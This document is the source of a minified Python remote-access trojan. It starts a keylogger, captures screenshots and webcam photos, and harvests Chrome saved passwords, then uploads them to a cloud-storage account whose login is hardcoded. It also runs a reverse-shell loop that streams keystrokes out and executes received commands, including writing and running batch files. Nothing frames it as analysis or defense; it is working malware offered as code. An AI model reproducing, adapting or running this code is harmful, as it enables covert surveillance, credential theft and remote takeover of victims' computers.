import threading,time,subprocess,socket,pcloud,os
G=True
r=open
d=str
y=int
n=None
import kloglib,passretlib,scrshotlib,webcamlib,reverselib
class M:
 def f():
  global keyloggerthread
  keyloggerthread=threading.Thread(target=kloglib.startklog)
  keyloggerthread.setDaemon(G)
  keyloggerthread.start()
class o:
 def K():
  name=''
  name=scrshotlib.tss(name)
  obj=pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")
  image_file=r(name,"rb")
  sc_image=image_file.read()
  image_file.close()
  obj.uploadfile(filename="/sswb/"+name,data=sc_image)
  os.remove(name)
 def E():
  name=""
  name=webcamlib.takepic()
  obj=pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")
  image_file=r(name,"rb")
  sc_image=image_file.read()
  image_file.close()
  obj.uploadfile(filename="/sswb/"+name,data=sc_image)
  os.remove(name)
class Y: 
 def T():
  pass_list=passretlib.retreive.chrome()
  t=time.gmtime()
  name="UNPW "+d(t.tm_hour)+"."+d(t.tm_min)+"."+d(t.tm_sec)+" "+d(t.tm_mday)+"-"+d(t.tm_mon)+"-"+d(t.tm_year)
  name=name+".txt"
  obj=pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")
  obj.uploadfile(filename="/unpw/"+name,data=("\n\n".join(pass_list)))
class U:
 class P:
  def b():
   global obj
   obj=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   obj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
   server="127.0.0.1"
   port=230
   ip=(server,port)
   while G:
    try:
     obj.connect(ip)
     while G:
      try:
       checkedlen=y(kloglib.helpers.lenofbufferkeys())
       if checkedlen>y(kloglib.helpers.pereverynum()):
        tosend=kloglib.helpers.sendbk()
        stringtheory="|JOIN|".join(tosend)
        obj.sendall(stringtheory.encode())
       time.sleep(5)
      except:
       n
    except:
     n
 class I:
  def b():
   global revobj
   revobj=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   revobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
   server="127.0.0.1"
   port=231
   ip=(server,port)
   while G:
    try:
     revobj.connect(ip)
    except:
     n
    while G:
     try:
      num=4096*4
      data=revobj.recv(num)
      data=data.decode()
      if data.lower()=="screenshot":
       o.K()
       tosend="Done!"
      elif data.lower()=="webshot":
       o.E()
       tosend="Done!"
      elif data.lower()=="getchromepasswords":
       Y.T()
       tosend="Done!"
      elif "#bashscriptstart" in data:
       data=data.replace("#bashscriptstart","")
       bat_file=r("ex.bat","w")
       bat_file.write(data)
       bat_file.close()
       fh=os.popen("ex.bat")
       tosend=fh.read()
      else:
       tosend=reverselib.rscommands(data)
      revobj.sendall(tosend.encode())
     except:
      n
M.f()
time.sleep(2)
klct=threading.Thread(target=U.P.b)
klct.setDaemon(G)
klct.start()
rsct=threading.Thread(target=U.I.b)
rsct.setDaemon(G)
rsct.start()
while G:
 n
# Created by pyminifier (https://github.com/liftoff/pyminifier)

